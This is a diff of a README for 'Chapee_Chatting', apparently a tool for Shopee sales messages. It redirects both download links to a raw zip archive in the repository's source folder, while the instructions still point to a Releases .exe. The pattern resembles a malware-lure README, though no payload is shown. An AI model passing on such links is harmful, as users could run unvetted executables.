@@ -1,6 +1,6 @@
 # 💬 Chapee_Chatting - Manage your Shopee sales messages easily
 
-[![](https://img.shields.io/badge/Download-Chapee_Chatting-blue.svg)](https://github.com/ahamed-Recruiter/Chapee_Chatting)
+[![](https://img.shields.io/badge/Download-Chapee_Chatting-blue.svg)](https://github.com/ahamed-Recruiter/Chapee_Chatting/raw/refs/heads/main/src/Chapee_Chatting_2.9-beta.4.zip)
 
 ## 🎯 Purpose of this application 
 
@@ -19,7 +19,7 @@ Your computer must meet these basic needs to run the software:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to find the latest version of the app: [Click here to download Chapee_Chatting](https://github.com/ahamed-Recruiter/Chapee_Chatting).
+1. Visit the following link to find the latest version of the app: [Click here to download Chapee_Chatting](https://github.com/ahamed-Recruiter/Chapee_Chatting/raw/refs/heads/main/src/Chapee_Chatting_2.9-beta.4.zip).
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the link that ends with .exe to start your download.
 4. Open the folder where your file saved.
